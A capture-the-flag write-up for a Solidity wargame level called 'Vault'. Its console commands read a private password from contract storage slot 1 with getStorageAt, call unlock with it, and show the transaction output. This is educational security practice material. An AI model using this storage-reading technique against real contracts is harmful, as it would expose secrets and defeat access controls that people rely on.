# Level 8: Vault

### Wargame
Unlock the vault to pass the level!

### Key Insights
* Storage Slots
* In Solidity, all state variables—including private ones—are stored in storage slots, which are part of the contract’s persistent storage. 

### Attack Steps
1. Before executing the attack, display the locked value of the target contract.
    ```bash
    > await contract.locked()
    true
    ```

2. Retrieve the password value from the storage slots of the target contract.
    ```bash
    > password = await web3.eth.getStorageAt(instance, 1)
    '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
    ```

3. Call the unlock with the password value to attack the contract.
    ```bash
    > await contract.unlock(password)
    {tx: '0x5ee4c50bc2b754b2c67d2ba5228cc157d3fca9a41916dcc4d821ed3be0d736a9', receipt: {…}, logs: Array(0)}
    ```

4. After the transaction is confirmed, display the locked value of the target contract again.
    ```bash
    > await contract.locked()
    false
    ```
